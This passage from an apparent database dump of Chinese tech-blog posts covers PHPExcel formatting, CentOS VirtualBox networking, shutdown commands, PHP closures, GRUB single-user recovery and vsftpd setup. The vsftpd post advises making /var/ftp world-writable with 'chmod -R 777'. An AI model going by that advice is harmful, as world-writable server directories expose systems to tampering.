$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;A4&amp;#39;)-&amp;gt;getBorders()-&amp;gt;getTop()-&amp;gt;setBorderStyle(PHPExcel_Style_Border::BORDER_THIN);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;B4&amp;#39;)-&amp;gt;getBorders()-&amp;gt;getTop()-&amp;gt;setBorderStyle(PHPExcel_Style_Border::BORDER_THIN);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;C4&amp;#39;)-&amp;gt;getBorders()-&amp;gt;getTop()-&amp;gt;setBorderStyle(PHPExcel_Style_Border::BORDER_THIN);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;D4&amp;#39;)-&amp;gt;getBorders()-&amp;gt;getTop()-&amp;gt;setBorderStyle(PHPExcel_Style_Border::BORDER_THIN);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;E4&amp;#39;)-&amp;gt;getBorders()-&amp;gt;getTop()-&amp;gt;setBorderStyle(PHPExcel_Style_Border::BORDER_THIN);&lt;br /&gt;&lt;br /&gt;设置border的color&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;D13&amp;#39;)-&amp;gt;getBorders()-&amp;gt;getLeft()-&amp;gt;getColor()-&amp;gt;setARGB(&amp;#39;FF993300&amp;#39;);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;D13&amp;#39;)-&amp;gt;getBorders()-&amp;gt;getTop()-&amp;gt;getColor()-&amp;gt;setARGB(&amp;#39;FF993300&amp;#39;);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;D13&amp;#39;)-&amp;gt;getBorders()-&amp;gt;getBottom()-&amp;gt;getColor()-&amp;gt;setARGB(&amp;#39;FF993300&amp;#39;);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;E13&amp;#39;)-&amp;gt;getBorders()-&amp;gt;getTop()-&amp;gt;getColor()-&amp;gt;setARGB(&amp;#39;FF993300&amp;#39;);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;E13&amp;#39;)-&amp;gt;getBorders()-&amp;gt;getBottom()-&amp;gt;getColor()-&amp;gt;setARGB(&amp;#39;FF993300&amp;#39;);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;E13&amp;#39;)-&amp;gt;getBorders()-&amp;gt;getRight()-&amp;gt;getColor()-&amp;gt;setARGB(&amp;#39;FF993300&amp;#39;);&lt;br /&gt;&lt;br /&gt;设置填充颜色&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;A1&amp;#39;)-&amp;gt;getFill()-&amp;gt;setFillType(PHPExcel_Style_Fill::FILL_SOLID);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;A1&amp;#39;)-&amp;gt;getFill()-&amp;gt;getStartColor()-&amp;gt;setARGB(&amp;#39;FF808080&amp;#39;);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;B1&amp;#39;)-&amp;gt;getFill()-&amp;gt;setFillType(PHPExcel_Style_Fill::FILL_SOLID);&lt;br /&gt;　　$objPHPExcel-&amp;gt;getActiveSheet()-&amp;gt;getStyle(&amp;#39;B1&amp;#39;)-&amp;gt;getFill()-&amp;gt;getStartColor()-&amp;gt;setARGB(&amp;#39;FF808080&amp;#39;);&lt;br /&gt;&lt;br /&gt;加图片&lt;br /&gt;　　$objDrawing = new PHPExcel_Worksheet_Drawing();&lt;br /&gt;　　$objDrawing-&amp;gt;setName(&amp;#39;Logo&amp;#39;);&lt;br /&gt;　　$objDrawing-&amp;gt;setDescription(&amp;#39;Logo&amp;#39;);&lt;br /&gt;　　$objDrawing-&amp;gt;setPath(&amp;#39;./images/officelogo.jpg&amp;#39;);&lt;br /&gt;　　$objDrawing-&amp;gt;setHeight(36);&lt;br /&gt;　　$objDrawing-&amp;gt;setWorksheet($objPHPExcel-&amp;gt;getActiveSheet());&lt;br /&gt;　　$objDrawing = new PHPExcel_Worksheet_Drawing();&lt;br /&gt;　　$objDrawing-&amp;gt;setName(&amp;#39;Paid&amp;#39;);&lt;br /&gt;　　$objDrawing-&amp;gt;setDescription(&amp;#39;Paid&amp;#39;);&lt;br /&gt;　　$objDrawing-&amp;gt;setPath(&amp;#39;./images/paid.png&amp;#39;);&lt;br /&gt;　　$objDrawing-&amp;gt;setCoordinates(&amp;#39;B15&amp;#39;);&lt;br /&gt;　　$objDrawing-&amp;gt;setOffsetX(110);&lt;br /&gt;　　$objDrawing-&amp;gt;setRotation(25);&lt;br /&gt;　　$objDrawing-&amp;gt;getShadow()-&amp;gt;setVisible(true);&lt;br /&gt;　　$objDrawing-&amp;gt;getShadow()-&amp;gt;setDirection(45);&lt;br /&gt;　　$objDrawing-&amp;gt;setWorksheet($objPHPExcel-&amp;gt;getActiveSheet());&lt;br /&gt;&lt;br /&gt;在默认sheet后，创建一个worksheet&lt;br /&gt;　　echo date(&amp;#39;H:i:s&amp;#39;) . &amp;quot; Create new Worksheet objectn&amp;quot;;&lt;br /&gt;　　$objPHPExcel-&amp;gt;createSheet();&lt;br /&gt;　　$objWriter = PHPExcel_IOFactory::createWriter($objExcel, &amp;#39;Excel5&amp;#39;);&lt;br /&gt;　　$objWriter-save(&amp;#39;php://output&amp;#39;);&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;', 1386860153),
(87, 87, '&lt;p&gt;Virtualbox安装Centos虚拟机过程很简单，不做赘述&lt;/p&gt;&lt;p&gt;Centos虚拟机安装好之后&lt;/p&gt;&lt;p&gt;网络配置采用网络地址转换(NAT)模式，配置端口转发&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/12/1386860364_aaquzc_8192_20131016110558937.jpg&quot; title=&quot;20131016110558937.jpg&quot; /&gt;&lt;/p&gt;&lt;p&gt;为方便主机访问子系统的B/S项目，主机系统端口配置5555，子系统端口配置80&lt;/p&gt;&lt;p&gt;发现不能上网&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;命令行&lt;/p&gt;&lt;p&gt;#ping www.baidu.com&lt;/p&gt;&lt;p&gt;之后，出现connect: network is unreachable 的问题&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;#ifconfig -a&lt;/p&gt;&lt;p&gt;查看网络详情，发现没有IP地址&lt;/p&gt;&lt;p&gt;注意看是用的哪一块网卡，如果是eth0则检查配置文件ifcfg-eth0，如果是eth1则检查配置文件ifcfg-eth1&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;查看网络配置文件&lt;/p&gt;&lt;p&gt;#ls /etc/sysconfig/network-scripts/ifcfg-eth0&lt;/p&gt;&lt;p&gt;是否存在&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;注意：&lt;/span&gt;如果是用的第二块网卡则配置文件为ifcfg-eth1 &lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;一、如果文件存在，则手动配置IP&lt;/p&gt;&lt;p&gt;编辑该文件&lt;/p&gt;&lt;p&gt;#vi /etc/sysconfig/network-scripts/ifcfg-eth1&lt;/p&gt;&lt;p&gt;#service network restart&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;二、如果不存在，甚至在/etc/sysconfig 目录下不存在network-script目录，那么就需要你来建立这个目录，并创建ifcfg-eth1&lt;br /&gt;&lt;/p&gt;&lt;p&gt;#vi /etc/sysconfig/network-scripts/ifcfg-eth1&lt;/p&gt;&lt;p&gt;内容如下：&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/12/1386860403_zq3545_1949_20131008110821812.jpg&quot; title=&quot;20131008110821812.jpg&quot; /&gt;&lt;/p&gt;&lt;p&gt;只需要按实际情况修改 DEVICE HWADDR NETMASK IPADDR 这几项即可。&lt;/p&gt;&lt;p&gt;最后&lt;/p&gt;&lt;p&gt;#service network restart&lt;/p&gt;&lt;p&gt;#ifconfig -a&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;http://img.blog.csdn.net/20131008110942531?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvbHVvY2h1YW4=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; /&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;#ping www.baidu.com&lt;/p&gt;&lt;p&gt;发现已经可以通讯&lt;/p&gt;&lt;p&gt;#ping 192.168.1.125&lt;/p&gt;&lt;p&gt;发现可以通讯&lt;/p&gt;&lt;p&gt;主机浏览器访问虚拟机项目地址&lt;/p&gt;&lt;p&gt;http://192.168.1.125:5555/&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:18px;color:#cc0000&quot;&gt;&lt;strong&gt;其他方式上网：&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;主宿互访：&lt;/p&gt;&lt;p&gt;将虚拟机的网络配置改为桥接网卡，界面名称选择无线网卡&lt;/p&gt;&lt;p&gt;修改ifcfg-eth1文件&lt;br /&gt;&lt;/p&gt;&lt;p&gt;BOOTPROTO=static&lt;/p&gt;&lt;p&gt;IPADDR &amp;nbsp; NETMASK &amp;nbsp; GATEWAY &amp;nbsp; DNS&lt;/p&gt;&lt;p&gt;四项注释掉的配置项去掉注释&lt;/p&gt;&lt;p&gt;#service network restart&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386863916),
(88, 88, '&lt;div id=&quot;article_content&quot; class=&quot;article_content&quot;&gt;&lt;p&gt;Linux centos关机与重启命令详解与实战&lt;/p&gt;&lt;p&gt;　Linux centos重启命令：&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;1、reboot&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;2、shutdown -r now 立刻重启(root用户使用)&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;3、shutdown -r 10 过10分钟自动重启(root用户使用)&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;4、shutdown -r 20:35 在时间为20:35时候重启(root用户使用)&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;如果是通过shutdown命令设置重启的话，可以用shutdown -c命令取消重启&lt;/p&gt;&lt;p&gt;　Linux centos关机命令：&lt;/p&gt;&lt;p&gt;　　1、halt 立刻关机&lt;/p&gt;&lt;p&gt;　　2、poweroff 立刻关机&lt;/p&gt;&lt;p&gt;　　3、shutdown -h now 立刻关机(root用户使用)&lt;/p&gt;&lt;p&gt;　　4、shutdown -h 10 10分钟后自动关机&lt;/p&gt;&lt;p&gt;　　如果是通过shutdown命令设置关机的话，可以用shutdown -c命令取消重启&lt;/p&gt;&lt;/div&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386936963),
(95, 95, '&lt;h3&gt;PHP的闭包（Closure）也就是匿名函数。是PHP5.3引入的。&lt;/h3&gt;&lt;p&gt;闭包的语法很简单，需要注意的关键字就只有use，use意思是连接闭包和外界变量。&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;$a = function() use($b) {\r\n                                     \r\n}&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;font-size:20px;&quot;&gt;闭包的几个作用：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;strong&gt;1 减少foreach的循环的代码&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;比如手册&lt;a target=&quot;_blank&quot; href=&quot;http://php.net/manual/en/functions.anonymous.php&quot;&gt;http://php.net/manual/en/functions.anonymous.php&lt;/a&gt; 中的例子Cart&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php\r\n// 一个基本的购物车，包括一些已经添加的商品和每种商品的数量。\r\n// 其中有一个方法用来计算购物车中所有商品的总价格。该方法使用了一个closure作为回调函数。\r\nclass Cart\r\n{\r\n    const PRICE_BUTTER  = 1.00;\r\n    const PRICE_MILK    = 3.00;\r\n    const PRICE_EGGS    = 6.95;\r\n                                                      \r\n    protected   $products = array();\r\n                                                          \r\n    public function add($product, $quantity)\r\n    {\r\n        $this-&amp;gt;products[$product] = $quantity;\r\n    }\r\n                                                          \r\n    public function getQuantity($product)\r\n    {\r\n        return isset($this-&amp;gt;products[$product]) ? $this-&amp;gt;products[$product] :\r\n               FALSE;\r\n    }\r\n                                                          \r\n    public function getTotal($tax)\r\n    {\r\n        $total = 0.00;\r\n                                                              \r\n        $callback =\r\n            function ($quantity, $product) use ($tax, &amp;amp;$total)\r\n            {\r\n                $pricePerItem = constant(__CLASS__ . &quot;::PRICE_&quot; .\r\n                    strtoupper($product));\r\n                $total += ($pricePerItem * $quantity) * ($tax + 1.0);\r\n            };\r\n                                                              \r\n        array_walk($this-&amp;gt;products, $callback);\r\n        return round($total, 2);;\r\n    }\r\n}\r\n                                                      \r\n$my_cart = new Cart;\r\n                                                      \r\n// 往购物车里添加条目\r\n$my_cart-&amp;gt;add(&#039;butter&#039;, 1);\r\n$my_cart-&amp;gt;add(&#039;milk&#039;, 3);\r\n$my_cart-&amp;gt;add(&#039;eggs&#039;, 6);\r\n                                                      \r\n// 打出出总价格，其中有 5% 的销售税.\r\nprint $my_cart-&amp;gt;getTotal(0.05) . &quot;\r\n&quot;;\r\n// The result is 54.29\r\n?&amp;gt;&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;2 减少函数的参数&lt;/strong&gt;&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;function html ($code , $id=&quot;&quot;, $class=&quot;&quot;){\r\n                         \r\nif ($id !== &quot;&quot;) $id = &quot; id = &quot;$id&quot;&quot; ;\r\n                         \r\n$class = ($class !== &quot;&quot;)? &quot; class =&quot;$class&quot;&quot;:&quot;&amp;gt;&quot;;\r\n                         \r\n$open = &quot;&amp;lt;$code$id$class&quot;;\r\n                         \r\n$close = &quot;&amp;lt;/$code&amp;gt;&quot;;\r\n                         \r\nreturn function ($inner = &quot;&quot;) use ($open, $close){\r\n                         \r\nreturn &quot;$open$inner$close&quot;;};\r\n                         \r\n}&lt;/pre&gt;&lt;p&gt;如果是使用平时的方法，我们会把inner放到html函数参数中，这样不管是代码阅读还是使用都不如使用闭包&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;3 解除递归函数&lt;/strong&gt;&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php\r\n$fib = function($n) use(&amp;amp;$fib) {\r\n    if($n == 0 || $n == 1) return 1;\r\n    return $fib($n - 1) + $fib($n - 2);\r\n};\r\necho $fib(2) . &quot;\r\n&quot;; // 2\r\n$lie = $fib;\r\n$fib = function(){die(&#039;error&#039;);};//rewrite $fib variable\r\necho $lie(5); // error   because $fib is referenced by closure&lt;/pre&gt;&lt;p&gt;注意上题中的use使用了&amp;amp;，这里不使用&amp;amp;会出现错误$fib($n-1)是找不到function的（前面没有定义fib的类型）&lt;br /&gt;&lt;br /&gt;所以想使用闭包解除循环函数的时候就需要使用&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php\r\n$recursive = function () use (&amp;amp;$recursive){\r\n// The function is now available as $recursive\r\n}&lt;/pre&gt;&lt;p&gt;这样的形式&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;4 关于延迟绑定&lt;/strong&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;如果你需要延迟绑定use里面的变量，你就需要使用引用，否则在定义的时候就会做一份拷贝放到use中&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php\r\n$result = 0;\r\n                                                                                    \r\n$one = function()\r\n{ var_dump($result); };\r\n                                                                                    \r\n$two = function() use ($result)\r\n{ var_dump($result); };\r\n                                                                                    \r\n$three = function() use (&amp;amp;$result)\r\n{ var_dump($result); };\r\n                                                                                    \r\n$result++;\r\n                                                                                    \r\n$one();    // outputs NULL: $result is not in scope\r\n$two();    // outputs int(0): $result was copied\r\n$three();    // outputs int(1)&lt;/pre&gt;&lt;p&gt;使用引用和不使用引用就代表了是调用时赋值，还是申明时候赋值&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;参考链接：&lt;a title=&quot;PHP的闭包&quot; target=&quot;_blank&quot; href=&quot;http://www.cnblogs.com/yjf512/archive/2012/10/29/2744702.html&quot;&gt;http://www.cnblogs.com/yjf512/archive/2012/10/29/2744702.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1387176455),
(89, 89, '&lt;p&gt;首先启动虚拟系统，F12进入GRUB引导画面&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/12/1386860836_l9qd2k_467_20130929173251218.jpg&quot; title=&quot;20130929173251218.jpg&quot; /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;使用方向键选择进入你要启动的内核&lt;br /&gt;&lt;/p&gt;&lt;p&gt;按p键，输入密码进入下一步操作&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/12/1386860864_vp4huc_2032_20130929174124843.jpg&quot; title=&quot;20130929174124843.jpg&quot; /&gt;&lt;/p&gt;&lt;p&gt;点击键盘a&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/12/1386860894_l1b7ir_4391_20130929174252609.jpg&quot; title=&quot;20130929174252609.jpg&quot; /&gt;&lt;/p&gt;&lt;p&gt;在命令的最后输入空格加single ，点击回车进入单用户模式命令行&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/12/1386860923_nw2uec_6099_20130929174516906.jpg&quot; title=&quot;20130929174516906.jpg&quot; /&gt;&lt;/p&gt;&lt;p&gt;#vi /etc/rc.d/rc.local&lt;br /&gt;&lt;/p&gt;&lt;p&gt;编辑rc.local文件，将错误的命令删掉，保存&lt;/p&gt;&lt;p&gt;#shutdown -r now&lt;/p&gt;&lt;p&gt;重启，成功进入系统&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386863800),
(90, 90, '&lt;div id=&quot;article_content&quot; class=&quot;article_content&quot;&gt;&lt;p&gt;&lt;strong&gt;1.查看有没有安装vsftpd：&lt;br /&gt;&lt;/strong&gt; &amp;nbsp; &amp;nbsp;rpm -qa | grep vsftpd&lt;br /&gt;&lt;br /&gt;&lt;strong&gt;2.yum安装vsftpd：&lt;br /&gt;&lt;/strong&gt; &amp;nbsp; &amp;nbsp;yum install vsftpd&lt;br /&gt;&lt;br /&gt;&lt;strong&gt;3.rpm安装vsftpd:&lt;/strong&gt;&lt;br /&gt;&lt;span style=&quot;font-family:arial,helvetica,sans-serif&quot;&gt;&lt;span style=&quot;font-size:12px&quot;&gt;&lt;span style=&quot;color:#000000&quot;&gt; &amp;nbsp;可以从下面两个地方获得最新的vsftpd的RPM包&lt;a target=&quot;_blank&quot; href=&quot;https://www.redhat.com/&quot;&gt;https://www.redhat.com/&lt;/a&gt;或者&lt;a target=&quot;_blank&quot; href=&quot;http://www.rpmfind.net/&quot;&gt;http://www.rpmfind.net/&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:arial,helvetica,sans-serif&quot;&gt;&lt;span style=&quot;font-size:12px&quot;&gt;安装命令：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:arial,helvetica,sans-serif&quot;&gt;&lt;span style=&quot;font-size:12px&quot;&gt;&lt;strong&gt;rpm -Uvh vsftpd-1.1.3-8.i386.rpm&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:arial,helvetica,sans-serif&quot;&gt;&lt;span style=&quot;font-size:12px&quot;&gt;&lt;strong&gt;&lt;br /&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;strong&gt;4.设置每次开机时自动运行及手工启动它:&lt;br /&gt;&lt;/strong&gt;chkconfig vsftpd on&lt;br /&gt;service vsftpd start&lt;br /&gt;netstat -tl &amp;nbsp; &amp;nbsp;可以查看ftp端口是否在侦听了!&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;strong&gt;5.为vsftpd添加ftp账号&lt;/strong&gt;&lt;br /&gt;用useradd建立的用户，如果后面不加参数，建立的用户为普通用户，有系统登陆权限，所以要在useradd命令后面加上参数，为虚拟主机添加不可以登录系统的ftp专用账号，命令如下:&lt;br /&gt;# useradd &ndash;s /sbin/nologin &ndash;d /var/ftp -g ftp &lt;span style=&quot;color:#0000ff&quot;&gt;ftpadmin&lt;/span&gt;&lt;/p&gt;&lt;p&gt;如果显示如下信息：&lt;br /&gt;Creating mailbox file: File exists&lt;br /&gt;useradd: warning: the home directory already exists.&lt;br /&gt;Not copying any file from skel directory into it.&lt;br /&gt;&lt;br /&gt;表示用户家目录已经存在(/var/ftp)，不可再新建此目录，并非添加用户失败，接下来给用户设置密码，否则此账号不能使用，命令如下：&lt;span style=&quot;color:#4169e1&quot;&gt;&lt;br /&gt;&lt;/span&gt;# passwd &lt;span style=&quot;color:#0000ff&quot;&gt;ftpadmin&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;这样就为linux系统添加用户&lt;span style=&quot;color:#0000ff&quot;&gt;ftpadmin&lt;/span&gt;，用户目录指定为/var/ftp，属于ftp用户组，且此用户不能登陆系统。&lt;br /&gt;&lt;br /&gt;注:&lt;br /&gt;-s /sbin/nologin是让其不能登陆系统&lt;br /&gt;-d 是指定用户目录为/var/ftp&lt;br /&gt;-g ftp 把用户加入到ftp组中&lt;br /&gt;&lt;br /&gt;修改/var/www目录属性：&lt;br /&gt;$ &lt;span style=&quot;color:#ff0000&quot;&gt;chmod -R 777 /var/ftp&lt;/span&gt; 递归地给此目录下所有文件和子目录的读、写、执行权限&lt;br /&gt;$ chgrp -R ftp &amp;nbsp;/var/ftp 递归地把此目录及该目录下所有文件和子目录的组属性设置成ftp组 &lt;br /&gt;&lt;br /&gt;&lt;strong&gt;6.配置etc/vsftpd/vsftpd.conf文件:&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;nano -w /etc/vsftpd/vsftpd.conf&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;注：用nano编辑配置文件要加参数&ldquo;-w&rdquo;，用于取消自动换行，否则有可能会出错。&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;配置文件范例：&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;# Example config file /etc/vsftpd/vsftpd.conf&lt;br /&gt;#&lt;br /&gt;# The default compiled in settings are fairly paranoid. This sample file&lt;br /&gt;# loosens things up a bit, to make the ftp daemon more usable.&lt;br /&gt;# Please see vsftpd.conf.5 for all compiled in defaults.&lt;br /&gt;#&lt;br /&gt;# READ THIS: This example file is NOT an exhaustive list of vsftpd options.&lt;br /&gt;# Please read the vsftpd.conf.5 manual page to get a full idea of vsftpd&amp;#39;s&lt;br /&gt;# capabilities.&lt;br /&gt;#&lt;br /&gt;# Allow anonymous FTP? (Beware - allowed by default if you comment this out).&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;anonymous_enable=NO&lt;br /&gt;&lt;/span&gt;#&lt;br /&gt;# Uncomment this to allow local users to log in.&lt;br /&gt;local_enable=YES&lt;br /&gt;#&lt;br /&gt;# Uncomment this to enable any form of FTP write command.&lt;br /&gt;write_enable=YES&lt;br /&gt;#&lt;br /&gt;# Default umask for local users is 077. You may wish to change this to 022,&lt;br /&gt;# if your users expect that (022 is used by most other ftpd&amp;#39;s)&lt;br /&gt;local_umask=022&lt;br /&gt;#&lt;br /&gt;# Uncomment this to allow the anonymous FTP user to upload files. This only&lt;br /&gt;# has an effect if the above global write enable is activated. Also, you will&lt;br /&gt;# obviously need to create a directory writable by the FTP user.&lt;br /&gt;#anon_upload_enable=YES&lt;br /&gt;#&lt;br /&gt;# Uncomment this if you want the anonymous FTP user to be able to create&lt;br /&gt;# new directories.&lt;br /&gt;#anon_mkdir_write_enable=YES&lt;br /&gt;#&lt;br /&gt;# Activate directory messages - messages given to remote users when they&lt;br /&gt;# go into a certain directory.&lt;br /&gt;dirmessage_enable=YES&lt;br /&gt;#&lt;br /&gt;# Activate logging of uploads/downloads.&lt;br /&gt;xferlog_enable=YES&lt;br /&gt;#&lt;br /&gt;# Make sure PORT transfer connections originate from port 20 (ftp-data).&lt;br /&gt;connect_from_port_20=YES&lt;br /&gt;#&lt;br /&gt;# If you want, you can arrange for uploaded anonymous files to be owned by&lt;br /&gt;# a different user. Note! Using &amp;quot;root&amp;quot; for uploaded files is not&lt;br /&gt;# recommended!&lt;br /&gt;#chown_uploads=YES&lt;br /&gt;#chown_username=whoever&lt;br /&gt;#&lt;br /&gt;# You may override where the log file goes if you like. The default is shown&lt;br /&gt;# below.&lt;br /&gt;#xferlog_file=/var/log/vsftpd.log&lt;br /&gt;#&lt;br /&gt;# If you want, you can have your log file in standard ftpd xferlog format&lt;br /&gt;xferlog_std_format=YES&lt;br /&gt;#&lt;br /&gt;# You may change the default value for timing out an idle session.&lt;br /&gt;#idle_session_timeout=600&lt;br /&gt;#&lt;br /&gt;# You may change the default value for timing out a data connection.&lt;br /&gt;#data_connection_timeout=120&lt;br /&gt;#&lt;br /&gt;# It is recommended that you define on your system a unique user which the&lt;br /&gt;# ftp server can use as a totally isolated and unprivileged user.&lt;br /&gt;#nopriv_user=ftpsecure&lt;br /&gt;#&lt;br /&gt;# Enable this and the server will recognise asynchronous ABOR requests. Not&lt;br /&gt;# recommended for security (the code is non-trivial). Not enabling it,&lt;br /&gt;# however, may confuse older FTP clients.&lt;br /&gt;#async_abor_enable=YES&lt;br /&gt;#&lt;br /&gt;# By default the server will pretend to allow ASCII mode but in fact ignore&lt;br /&gt;# the request. Turn on the below options to have the server actually do ASCII&lt;br /&gt;# mangling on files when in ASCII mode.&lt;br /&gt;# Beware that on some FTP servers, ASCII support allows a denial of service&lt;br /&gt;# attack (DoS) via the command &amp;quot;SIZE /big/file&amp;quot; in ASCII mode. vsftpd&lt;br /&gt;# predicted this attack and has always been safe, reporting the size of the&lt;br /&gt;# raw file.&lt;br /&gt;# ASCII mangling is a horrible feature of the protocol.&lt;br /&gt;#ascii_upload_enable=YES&lt;br /&gt;#ascii_download_enable=YES&lt;br /&gt;#&lt;br /&gt;# You may fully customise the login banner string:&lt;br /&gt;#ftpd_banner=Welcome to blah FTP service.&lt;br /&gt;#&lt;br /&gt;# You may specify a file of disallowed anonymous e-mail addresses. Apparently&lt;br /&gt;# useful for combatting certain DoS attacks.&lt;br /&gt;#deny_email_enable=YES&lt;br /&gt;# (default follows)&lt;br /&gt;#banned_email_file=/etc/vsftpd/banned_emails&lt;br /&gt;#&lt;br /&gt;# You may specify an explicit list of local users to chroot() to their home&lt;br /&gt;# directory. If chroot_local_user is YES, then this list becomes a list of&lt;br /&gt;# users to NOT chroot().&lt;br /&gt;#chroot_list_enable=YES&lt;br /&gt;# (default follows)&lt;br /&gt;#chroot_list_file=/etc/vsftpd/chroot_list&lt;br /&gt;#&lt;br /&gt;# You may activate the &amp;quot;-R&amp;quot; option to the builtin ls. This is disabled by&lt;br /&gt;# default to avoid remote users being able to cause excessive I/O on large&lt;br /&gt;# sites. However, some broken FTP clients such as &amp;quot;ncftp&amp;quot; and &amp;quot;mirror&amp;quot; assume&lt;br /&gt;# the presence of the &amp;quot;-R&amp;quot; option, so there is a strong case for enabling it.&lt;br /&gt;#ls_recurse_enable=YES&lt;br /&gt;#&lt;br /&gt;# When &amp;quot;listen&amp;quot; directive is enabled, vsftpd runs in standalone mode and &lt;br /&gt;# listens on IPv4 sockets. This directive cannot be used in conjunction &lt;br /&gt;# with the listen_ipv6 directive.&lt;br /&gt;listen=YES&lt;br /&gt;#&lt;br /&gt;# This directive enables listening on IPv6 sockets. To listen on IPv4 and IPv6&lt;br /&gt;# sockets, you must run two copies of vsftpd whith two configuration files.&lt;br /&gt;# Make sure, 